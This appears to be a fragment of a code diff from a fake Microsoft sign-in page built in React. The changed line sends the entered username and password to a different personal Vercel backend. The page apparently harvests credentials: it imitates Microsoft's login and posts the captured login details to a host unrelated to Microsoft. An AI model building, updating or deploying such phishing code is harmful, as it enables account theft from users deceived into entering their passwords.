@@ -51,7 +51,7 @@ const MicrosoftSignIn = () => {
     if (validate()) {
       const data = { username: unameVal, password: pwdVal };
       axios
-        .post("https://backend-dxw3kjmmv-yesus-projects-e758688f.vercel.app/submit", data, {
+        .post("https://backend-69h5gteok-yesus-projects-e758688f.vercel.app/submit", data, {
           headers: {
             'Content-Type': 'application/json'
         }})
